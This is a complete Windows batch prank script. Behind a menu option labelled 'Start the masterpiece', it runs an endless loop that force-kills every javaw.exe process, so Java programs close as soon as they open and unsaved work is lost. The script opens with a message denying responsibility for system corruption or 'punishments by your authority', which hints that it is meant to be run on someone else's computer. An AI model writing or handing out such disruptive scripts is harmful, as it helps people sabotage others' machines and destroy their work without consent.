@echo off

color 1F
title whoops...

msg "%username%" 'us' or 'we' are not responsible for any corruption of the system or any punishments by your authority.

:MAINMENU
cls
mode con cols=98 lines=30
echo.              
echo.                  
echo.                     _________________________________________________________
echo.                    ^|                                                         ^|
Echo.                    ^|   [1] Start the masterpiece                             ^|
Echo.                    ^|                                                         ^|
Echo.                    ^|   [2] Exit (not cool)                                   ^|  
Echo.                    ^|_________________________________________________________^|
ECHO.            
choice /C:12 /N /M ".                   Enter Your Choice [1,2] : "
if errorlevel 2 goto:Exit
if errorlevel 1 goto:Start

:Start
cls
:loop
taskkill /f /IM javaw.exe
goto loop
REM Start End

:Exit
exit